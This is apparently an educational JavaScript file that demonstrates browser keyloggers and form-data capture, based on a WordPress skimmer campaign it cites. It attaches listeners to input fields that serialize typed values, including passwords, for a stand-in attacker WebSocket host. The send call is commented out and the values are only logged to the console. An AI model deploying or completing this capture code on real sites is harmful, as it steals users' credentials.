////////////////////////////////////////////////////////////////////////////////
// REAL-ISH KEYLOGGER  /////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

// As you can see, it’s a keylogger.
// This script adds a handler to every input field on the websites to send its value to the attacker (wss://cloudflare[.]solutions:8085/) when a user leaves that field.
var socketurl = "wss://my.bad.guy.server:9973/";
var socket = socketurl;//new ReconnectingWebSocket(socketurl);

// What was observed was that scripts where identified over the web that really didn't do what they appeared to do (lint)
// but rather the domain names were red herrings. The payload was embedded in encoaded hex sequences and subsequently decoded,
// injecting code similar to what follows into each webpage that had this code.
//
// For more info, see:
// https://blog.sucuri.net/2017/12/cloudflare-solutions-keylogger-on-thousands-of-infected-wordpress-sites.html

function process_event(event) {
    var result = JSON.stringify({
        key: event.target.value,
        element: event.target.id
    });
    console.log(`your password (key): ${event.target.value}, from input field w/ ID (element): ${event.target.id}`);
    // socket.send(result);
}

var i_fields = document.getElementsByTagName('input');
for (var i = 0; i < i_fields.length; i++) {
    i_fields[i].addEventListener('blur', process_event);
}

////////////////////////////////////////////////////////////////////////////////
// SIMPLE KEYLOGGER (really just listening to key press events) ////////////////
////////////////////////////////////////////////////////////////////////////////

// // Show the pressed character (shows all keys pressed while this page is loaded)
// document.addEventListener("keypress", e => {
//   console.log(`COMMON-EVENT: You pressed the ${String.fromCharCode(e.charCode)} key while on the webpage`);
// });
//
// // Show the pressed character (shows all keys pressed while this page is loaded)
// document.getElementById("password").addEventListener("keypress", e => {
//   console.log(`PASSWORD-EVENT: you pressed the ${String.fromCharCode(e.charCode)} key in the password field`);
// });

// Handle page closing
// window.addEventListener("beforeunload", e => {
//   const message = "Are you sure you want to go? If you go, I'll send your password off to my super secret server...";
//   console.log(message);
//   // Standard way of showing a confirmation dialog
//   e.returnValue = message;
//   // Browser-specific way of showing a confirmation dialog
//   return message;
// });

////////////////////////////////////////////////////////////////////////////////
// FORM EXAMPLE W/ INTERESTING DATA FIELDS, INCLUDING PASSWORD /////////////////
////////////////////////////////////////////////////////////////////////////////

// Shows all user input and cancels form data sending
// Show some info about the first form element
const formElement = document.querySelector("form");
// console.log(`Number of fields: ${formElement.elements.length}`); // 10

// >>> This "formElement" element has an elements property that pulls together all the form input fields.
//     You can use this property to access a field via its name attribute or by its index (order of appearance in the form).

formElement.addEventListener("submit", e => {
  const username = e.target.elements.username.value;
  const password = e.target.elements.password.value;
  const email = e.target.elements.emailAddress.value;
  console.log(`Username: ${username}, password: ${password}, email: ${email}`);

  if (e.target.elements.confirmation.checked) {
    console.log("You asked for email confirmation");
  } else {
    console.log("You didn't asked for email confirmation");
  }
  switch (e.target.elements.subscription.value) {
    case "newspromo":
      console.log("You are subscribed to newsletters and promotions");
      break;
    case "news":
      console.log("You are subscribed to newsletters only");
      break;
    case "no":
      console.log("You are not subscribed to anything");
      break;
    default:
      console.error("Unknown subscription code");
  }
  switch (e.target.elements.nationality.value) {
    case "US":
      console.log("Hello! You are a US citizen");
      break;
    case "FR":
      console.log("Bonjour! You are a French citizen");
      break;
    case "ES":
      console.log("Hola! You are a Spanish citizen");
      break;
    default:
      console.log("Your nationality is unknown");
  }
  e.preventDefault(); // Cancel form data sending
});

// Validate password length
document.getElementById("password").addEventListener("input", e => {
  const password = e.target.value; // Value of the password field
  let passwordLength = "too short";
  let messageColor = "red"; // Short password => red
  if (password.length >= 8) {
    passwordLength = "adequate";
    messageColor = "green"; // Long password => green
  } else if (password.length >= 4) {
    passwordLength = "moderate";
    messageColor = "orange"; // Moderate password => orange
  }
  const passwordHelpElement = document.getElementById("passwordHelp");
  passwordHelpElement.textContent = `Length: ${passwordLength}`; // helper text
  passwordHelpElement.style.color = messageColor; // helper text color
});
